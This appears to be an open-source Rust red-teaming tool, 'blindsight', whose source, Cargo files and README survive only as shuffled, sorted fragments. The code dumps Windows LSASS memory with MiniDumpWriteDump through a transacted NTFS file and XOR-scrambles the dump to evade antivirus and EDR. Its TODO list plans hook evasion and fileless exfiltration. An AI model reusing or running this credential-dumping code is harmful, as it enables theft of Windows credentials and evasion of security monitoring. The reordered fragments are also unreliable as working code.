                
            .Value
            .cast::<u8>()
            FILE_ATTRIBUTE_TEMPORARY 
            FILE_GENERIC_READ.0 
            Some(std::ptr::from_ref::<TXFS_MINIVERSION>(
            process::exit(1)
        )
        .collect()
        .file_name()
        .for_each(
        .map(char::from)
        .next()
        .processes_by_exact_name(LSASS.as_ref())
        .sample_iter(
        .take(size)
        .to_str()
        .unwrap()
        .unwrap_or(PROG)
        .zip(key.iter().cycle())
        2 => 
        CloseHandle(file_handle)
        CloseHandle(map_handle)
        CloseHandle(proc_handle)
        CloseHandle(txf_handle)
        CreateFileTransactedA(
        CreateTransaction(
        Err(err) => {
        MiniDumpWriteDump(
        _ => unscramble(action)
        len = buf.len()
        len = data.len()
        usage(prog)
        }
    )
    // Cleanup
    // Create NTFS transaction object (TxF API)
    // Create intermediate output file as a transacted operation
    // Create output file with a random name
    // Dump LSASS memory to intermediate output file
    // Find LSASS process
    // Get LSASS pid
    // Let's do it
    // Load system information
    // Map a view of the intermediate file into our address space
    // Open LSASS process
    // Open and read input file
    // Parse command line arguments
    // Return pid
    // Scramble dump using a temporary vector to hold data
    // Unscramble dump
    // Write scrambled dump to output file
    // Write unscrambled dump to output file
    Ok(())
    Ok(proc.pid().as_u32())
    data.iter_mut()
    dump.clone_from_slice(data)
    if action.starts_with('-') {
    in_file.read_to_end(
    let action = match args.len() {
    let args: Vec<String> = env::args().collect()
    let count = out_file.write(
    let file_handle = unsafe {
    let file_ptr = filename.as_mut_ptr()
    let mut buf = Vec::<u8>::new()
    let mut dump = vec![0u8
    let mut in_file = File::open(path)
    let mut out_file = File::create_new(DUMP)
    let mut out_file = File::create_new(path)
    let mut sys = System::new_all()
    let path = PathBuf::from(path)
    let pid = lsass_pid()
    let proc = sys
    let prog = Path::new(
    let ptr = unsafe {
    let txf_handle = unsafe {
    match action {
    match blindsight::run(action) {
    println!(
    println!()
    process::exit(1)
    scramble(
    sys.refresh_all()
    thread_rng()
    unsafe {
    }
 <https://adepts.of0x.cc/hookson-hootoff/>
 <https://attack.mitre.org/techniques/T1003/001/>
 <https://github.com/Kudaes/Dumpy>
 <https://github.com/anthemtotheego/CredBandit>
 <https://github.com/fortra/nanodump>
 <https://github.com/joaoviictorti/RustRedOps>
 <https://github.com/w1u0u1/minidump>
 <https://security.humanativaspa.it/an-offensive-rust-encore>
 <https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html>
 <https://www.ired.team/offensive-security/credential-access-and-credential-dumping>
 <https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary>
 Allow to manually specify LSASS pid to avoid noisy process scans
 Consider better command line handling if minimal is not enough
 Consider dumping to memory using minidump callbacks instead of TxF API
 Cross-compiling (macOS example)
 Examples
 It is not intended for manual editing.
 Microsoft Windows 10 (x64)
 Microsoft Windows 11 (ARM64)
 Microsoft Windows 11 (x64)
 Microsoft Windows Server 2016 (x64)
 Microsoft Windows Server 2019 (x64)
 Microsoft Windows Server 2022 (x64)
 See also
 TODO
 Tested on
 This file is automatically @generated by Cargo.
 Usage
 Use <https://github.com/Kudaes/DInvoke_rs> or similar for API hooks evasion
 Use https://github.com/Kudaes/DInvoke_rs or similar for API hooks evasion
 Use litcrypt2 or similar to encrypt strings locally
 [CredBandit](https://github.com/anthemtotheego/CredBandit)
 [Dumpy](https://github.com/Kudaes/Dumpy)
 [Mitre](https://attack.mitre.org/techniques/T1003/001/)
 [RT Notes](https://www.ired.team/offensive-security/credential-access-and-credential-dumping)
 [RustRedOps](https://github.com/joaoviictorti/RustRedOps)
 [Synacktiv](https://www.synacktiv.com/en/publications/windows-secrets-extraction-a-summary)
 [minidump](https://github.com/w1u0u1/minidump)
 [nanodump](https://github.com/fortra/nanodump)
 blindsight
 codegen-units = 1
 file_to_unscramble.log]
 https://adepts.of0x.cc/hookson-hootoff/
 https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html
 see https://github.com/johnthagen/min-sized-rust
 size]
"            )),"
"            0,"
"            CREATE_NEW,"
"            FILE_SHARE_WRITE,"
"            INFINITE,"
"            MiniDumpWithFullMemory,"
"            None,"
"            PCSTR(file_ptr),"
"            PCWSTR(ptr::null_mut()),"
"            eprintln!(""[!] Error: {err}"")"
"            file_handle,"
"            pid,"
"            proc_handle,"
"            ptr::null_mut(),"
"            txf_handle,"
"        ""["
"        ""dump"" => dump()"
"        .ok_or(""Process not found"")"
"        1 => ""dump"","
"        MapViewOfFile(map_handle, FILE_MAP_READ, 0, 0, 0)"
"        Ok(()) => (),"
"        _ => ""-"","
"    ""Win32_Security"","
"    ""Win32_Storage_FileSystem"","
"    ""Win32_System_Diagnostics_Debug"","
"    ""Win32_System_Kernel"","
"    ""Win32_System_Memory"","
"    ""Win32_System_Threading"","
"    let data = unsafe { slice::from_raw_parts_mut(ptr, size) }"
"    let map_handle = unsafe { CreateFileMappingW(file_handle, None, PAGE_READONLY, 0, 0, None)"
"    let mut filename = format!(""."
"    let path = format!(""."
"    let proc_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)"
"    let size = unsafe { GetFileSize(file_handle, None) } as usize"
"    println!("""
"    println!(""."
"    println!(""Copyright (c) 2024 Marco Ivaldi <raptor@0xdeadbeef.info>"")"
"    println!(""Usage:"")"
"    println!(""["
"    println!(""blindsight - Dump LSASS memory bypassing countermeasures"")"
"    xor(buf.as_mut_slice(), KEY)"
"    xor(data, key)"
" ""cfg-if"","
" ""core-foundation-sys"","
" ""crossbeam-deque"","
" ""crossbeam-epoch"","
" ""crossbeam-utils"","
" ""either"","
" ""getrandom"","
" ""libc"","
" ""memchr"","
" ""ntapi"","
" ""ppv-lite86"","
" ""proc-macro2"","
" ""quote"","
" ""rand"","
" ""rand_chacha"","
" ""rand_core"","
" ""rayon"","
" ""rayon-core"","
" ""syn"","
" ""sysinfo"","
" ""unicode-ident"","
" ""wasi"","
" ""winapi"","
" ""winapi-i686-pc-windows-gnu"","
" ""winapi-x86_64-pc-windows-gnu"","
" ""windows"","
" ""windows-core"","
" ""windows-implement"","
" ""windows-interface"","
" ""windows-result"","
" ""windows-targets"","
" ""windows_aarch64_gnullvm"","
" ""windows_aarch64_msvc"","
" ""windows_i686_gnu"","
" ""windows_i686_gnullvm"","
" ""windows_i686_msvc"","
" ""windows_x86_64_gnu"","
" ""windows_x86_64_gnullvm"","
" ""windows_x86_64_msvc"","
" Avoid directly opening LSASS handle (e.g., via PssCaptureSnapshot)"
" FILE_FLAG_DELETE_ON_CLOSE,"
" FILE_GENERIC_WRITE.0,"
" Implement fileless exfiltration channels (e.g., TFTP, FTP, HTTP...)"
" Optimize memory usage (simply corrupt ""magic bytes"" instead of XORing"
" file_to_unscramble.log]"")"
"(byte, key_byte)"
"//! > ""There's no such things as survival of the fittest.  "
"//! > -- Peter Watts, Blindsight (2006)  "
"//! > All that matters is whether it beats the alternative.""  "
"//! > Survival of the most adequate, maybe.  "
"//! Red teaming tool to dump LSASS memory, bypassing basic countermeasures."
"//! dump, to avoid triggering AV/EDR/XDR."
"> ""There's no such things as survival of the fittest.  "
"> -- Peter Watts, Blindsight (2006)"
"> All that matters is whether it beats the alternative."""
"> Survival of the most adequate, maybe.  "
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"Note: Do not test on production servers, as accessing LSASS might cause system instability!"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
"Red teaming tool to dump LSASS memory, bypassing basic countermeasures."
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
"TXFS_MINIVERSION_DIRTY_VIEW,"
"[u8] = b""DEADBEEF"""
"] Done writing {count} bytes to disk!"")"
"] Dump successful!"")"
"] Found {LSASS} pid: {pid}"")"
"] Scrambling dump and writing {len} bytes to disk"","
"] Successfully created output file"")"
"] Successfully read from input file"")"
"] Trying to dump to output file: {path}"")"
"] Trying to read from input file: {path}"")"
"] Trying to unscramble {len} bytes to output file: {DUMP}"","
"all = { level = ""warn"", priority = -1 }"
"args[1].clone(),"
"authors = [""Marco Ivaldi <raptor@0xdeadbeef.info>""]"
"cargo = { level = ""warn"", priority = -1 }"
"categories = [""command-line-utilities""]"
"checksum = ""06ea2b9bc92be3c2baa9334a323ebca2d6f074ff852cd1d7b11064035cd3868f"""
"checksum = ""09ec2a7bb152e2252b53fa7803150007879548bc709c039df7627cabbd05d469"""
"checksum = ""0eee52d38c090b3caa76c563b86c3a4bd71ef1a819287c19d586d7334ae8ed66"""
"checksum = ""0fa76aaf39101c457836aec0ce2316dbdc3ab723cdda1c6bd4e6ad4208acaca7"""
"checksum = ""12342cb4d8e3b046f3d80effd474a7a02447231330ef77d71daa6fbc40681143"""
"checksum = ""1465873a3dfdaa8ae7cb14b4383657caab0b3e8a0aa9ae8e04b044854c8dfce2"""
"checksum = ""147a5c80aabfbf0c7d901cb5895d1de30ef2907eb21fbbab29ca94c5b08b1a78"""
"checksum = ""22ec99545bb0ed0ea7bb9b8e1e9122ea386ff8a48c0922e43f36d45ab09e0e80"""
"checksum = ""240948bc05c5e7c6dabba28bf89d89ffce3e303022809e73deaefe4f6ec56c66"""
"checksum = ""24d5b23dc417412679681396f2b49f3de8c1473deb516bd34410872eff51ed0d"""
"checksum = ""29bee4b38ea3cde66011baa44dba677c432a78593e202392d1e9070cf2a7fca7"""
"checksum = ""32a4622180e7a0ec044bb555404c800bc9fd9ec262ec147edd5989ccd0c02cd3"""
"checksum = ""3354b9ac3fae1ff6755cb6db53683adb661634f67557942dea4facebec0fee4b"""
"checksum = ""34af8d1a0e25924bc5b7c43c079c942339d8f0a8b57c39049bef581b46327404"""
"checksum = ""355dbe4f8799b304b05e1b0f05fc59b2a18d36645cf169607da45bde2f69a1be"""
"checksum = ""589f6da84c646204747d1270a2a5661ea66ed1cced2631d546fdfb155959f9ec"""
"checksum = ""5b40af805b3121feab8a3c29f04d8ad262fa8e0561883e7653e024ae4479e6de"""
"checksum = ""5b82ac4a3c2ca9c3460964f020e1402edd5753411d7737aa39c3714ad1b5420e"""
"checksum = ""5c839a674fcd7a98952e593242ea400abe93992746761e38641405d28b00f419"""
"checksum = ""5e383302e8ec8515204254685643de10811af0ed97ea37210dc26fb0032647f8"""
"checksum = ""5e719e8df665df0d1c8fbfd238015744736151d4445ec0836b8e628aae103b77"""
"checksum = ""60b1af1c220855b6ceac025d3f6ecdd2b7c4894bfe9cd9bda4fbb4bc7c0d4cf0"""
"checksum = ""613f8cc01fe9cf1a3eb3d7f488fd2fa8388403e97039e2f73692932e291a770d"""
"checksum = ""712e227841d057c1ee1cd2fb22fa7e5a5461ae8e48fa2ca79ec42cfc1931183f"""
"checksum = ""78ca9ab1a0babb1e7d5695e3530886289c18cf2f87ec19a575a0abdce112e3a3"""
"checksum = ""8e9b5ad5ab802e97eb8e295ac6720e509ee4c243f69d781394014ebfe8bbfa0b"""
"checksum = ""9107ddc059d5b6fbfbffdfa7a7fe3e22a226def0b2608f72e9d552763d3e1ad7"""
"checksum = ""97b3888a4aecf77e811145cadf6eef5901f4782c53886191b2f693f24761847c"""
"checksum = ""9b724f72796e036ab90c1021d4780d4d3d648aca59e491e6b98e725b84e99973"""
"checksum = ""9c8d87e72b64a3b4db28d11ce29237c246188f4f51057d65a7eab63b7987e423"""
"checksum = ""ac3b87c63620426dd9b991e5ce0329eff545bccbbb34f3be09ff6fb6ab51b7b6"""
"checksum = ""b146dcf730474b4bcd16c311627b31ede9ab149045db4d6088b3becaea046462"""
"checksum = ""b418a60154510ca1a002a752ca9714984e21e4241e804d32555251faf8b78ffa"""
"checksum = ""baf1de4339761588bc0619e3cbc0120ee582ebb74b53b4efbf79117bd2da40fd"""
"checksum = ""c4567c8db10ae91089c99af84c68c38da3ec2f087c3f82960bcdbf3656b6f4d7"""
"checksum = ""d2ed2439a290666cd67ecce2b0ffaad89c2a56b976b736e6ece670297897832d"""
"checksum = ""e6c10a63a0fa32252be49d21e7709d4d4baf8d231c2dbce1eaa8141b9b127d88"""
"checksum = ""e8a3895c6391c39d7fe7ebc444a87eb2991b2a0bc718fdabd071eec617fc68e4"""
"checksum = ""ec0be4795e2f6a28069bec0b5ff3e2ac9bafc99e6a9a7dc3547996c5c816922c"""
"copies of the Software, and to permit persons to whom the Software is"
"description = ""Red teaming tool to dump LSASS memory, bypassing basic countermeasures."""
"doc_markdown = ""allow"""
"dump, to avoid triggering AV/EDR/XDR."
"edition = ""2021"""
"fn dump() -> Result<(), Box<dyn Error>> {"
"fn lsass_pid() -> Result<u32, Box<dyn Error>> {"
"furnished to do so, subject to the following conditions:"
"homepage = ""https://0xdeadbeef.info/"""
"https://github.com/rust-lang/crates.io-index"""
"in the Software without restriction, including without limitation the rights"
"keywords = [""windows"", ""minidump"", ""mimikatz"", ""redteaming"", ""exploitation""]"
"license = ""MIT"""
"lsass.dmp"""
"missing_errors_doc = ""allow"""
"mut [u8], key: "
"mut dump, KEY)"
"nExamples:"")"
"name = ""blindsight"""
"name = ""cfg-if"""
"name = ""core-foundation-sys"""
"name = ""crossbeam-deque"""
"name = ""crossbeam-epoch"""
"name = ""crossbeam-utils"""
"name = ""either"""
"name = ""getrandom"""
"name = ""libc"""
"name = ""memchr"""
"name = ""ntapi"""
"name = ""ppv-lite86"""
"name = ""proc-macro2"""
"name = ""quote"""
"name = ""rand"""
"name = ""rand_chacha"""
"name = ""rand_core"""
"name = ""rayon"""
"name = ""rayon-core"""
"name = ""syn"""
"name = ""sysinfo"""
"name = ""unicode-ident"""
"name = ""wasi"""
"name = ""winapi"""
"name = ""winapi-i686-pc-windows-gnu"""
"name = ""winapi-x86_64-pc-windows-gnu"""
"name = ""windows"""
"name = ""windows-core"""
"name = ""windows-implement"""
"name = ""windows-interface"""
"name = ""windows-result"""
"name = ""windows-targets"""
"name = ""windows_aarch64_gnullvm"""
"name = ""windows_aarch64_msvc"""
"name = ""windows_i686_gnu"""
"name = ""windows_i686_gnullvm"""
"name = ""windows_i686_msvc"""
"name = ""windows_x86_64_gnu"""
"name = ""windows_x86_64_gnullvm"""
"name = ""windows_x86_64_msvc"""
"nursery = { level = ""warn"", priority = -1 }"
"of this software and associated documentation files (the ""Software""), to deal"
"opt-level = ""z"""
"panic = ""abort"""
"pedantic = { level = ""warn"", priority = -1 }"
"rand = ""0.8"""
"repository = ""https://github.com/0xdea/blindsight"""
"source = ""registry"
"str = ""."
"str = ""bindsight.exe"""
"str = ""lsass.exe"""
"str) -> Result<(), Box<dyn Error>> {"
"sysinfo = ""0.31"""
"target = ""x86_64-pc-windows-gnu"""
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"use std::io::{Read, Write}"
"use windows::core::{PCSTR, PCWSTR}"
"version = ""0.1.0"""
"version = ""0.1.2"""
"version = ""0.11.0"
"version = ""0.2.15"""
"version = ""0.2.155"""
"version = ""0.2.17"""
"version = ""0.3.1"""
"version = ""0.3.9"""
"version = ""0.31.4"""
"version = ""0.4.0"""
"version = ""0.4.1"""
"version = ""0.52.6"""
"version = ""0.57"""
"version = ""0.57.0"""
"version = ""0.6.4"""
"version = ""0.8.20"""
"version = ""0.8.5"""
"version = ""0.8.6"""
"version = ""0.9.18"""
"version = ""1.0.0"""
"version = ""1.0.12"""
"version = ""1.0.36"""
"version = ""1.0.86"""
"version = ""1.10.0"""
"version = ""1.12.1"""
"version = ""1.13.0"""
"version = ""2.0.71"""
"version = ""2.7.4"""
"wasi-snapshot-preview1"""
"wildcard_imports = ""allow"""
"{prog} 29ABE9Hy.log"")"
"{prog}"")"
"{rand}.log"", rand = rand_str(8))"
$ brew install mingw-w64
$ cargo build --release --target x86_64-pc-windows-gnu
$ rustup target add x86_64-pc-windows-gnu
.DS_Store
.cargo-ok
.idea
//! 
//! $ brew install mingw-w64
//! $ cargo build --release --target x86_64-pc-windows-gnu
//! $ rustup target add x86_64-pc-windows-gnu
//! >  
//! > It doesn't matter whether a solution's optimal.  
//! Copyright (c) 2024 Marco Ivaldi <raptor@0xdeadbeef.info>
//! Dump LSASS memory:
//! Inside an Administrator's PowerShell window:
//! It uses Transactional NTFS (TxF API) to transparently scramble the memory
//! PS C:
//! Unscramble memory dump:
//! blindsight - Dump LSASS memory bypassing countermeasures
/// Dispatch to function implementing the selected action
/// Dump LSASS memory to scrambled output file
/// Generate a random string
/// Get LSASS pid
/// Print usage information and exit
/// Scramble a slice of bytes in place
/// Unscramble a memory dump
/// XOR a slice of bytes with a key in place
/target
= key_byte)
> It doesn't matter whether a solution's optimal.  
Alphanumeric)
Blog post:
Copyright (c) 2024 raptor
Dump LSASS memory:
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
Inside an Administrator's PowerShell window:
It uses Transactional NTFS (TxF API) to transparently scramble the memory
MIT License
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
See also:
The above copyright notice and this permission notice shall be included in all
Unscramble memory dump:
[![](https://img.shields.io/badge/mastodon-%40raptor-purple.svg)](https://infosec.exchange/@raptor)
[![](https://img.shields.io/badge/twitter-%400xdea-blue.svg)](https://twitter.com/0xdea)
[![](https://img.shields.io/github/forks/0xdea/blindsight.svg
[![](https://img.shields.io/github/stars/0xdea/blindsight.svg
[![](https://img.shields.io/github/watchers/0xdea/blindsight.svg
[[package]]
[build]
[dependencies.windows]
[dependencies]
[lints.clippy]
[package]
[profile.release]
[u8]) {
] Successfully opened {LSASS} handle: {proc_handle:
args[0])
blindsight.exe
blindsight.exe 29ABE9Hy.log
blindsight.exe [dump 
buf)
byte 
color=green)](https://github.com/0xdea/blindsight)
color=red)](https://github.com/0xdea/blindsight)
color=yellow)](https://github.com/0xdea/blindsight)
const DUMP: 
const KEY: 
const LSASS: 
const PROG: 
copies or substantial portions of the Software.
dependencies = [
dump)
features = [
fn main() {
fn rand_str(size: usize) -> String {
fn scramble(data: 
fn unscramble(path: 
fn usage(prog: 
fn xor(data: 
lto = true
mut buf)
pub fn run(action: 
str) {
strip = true
style=flat
use rand::distributions::Alphanumeric
use rand::prelude::
use std::env
use std::error::Error
use std::fs::File
use std::path::Path
use std::path::PathBuf
use std::process
use std::ptr
use std::slice
use sysinfo::System
use windows::Win32::Foundation::CloseHandle
use windows::Win32::Storage::FileSystem::
use windows::Win32::System::Diagnostics::Debug::
use windows::Win32::System::Memory::
use windows::Win32::System::Threading::
version = 3
{prog} [dump 
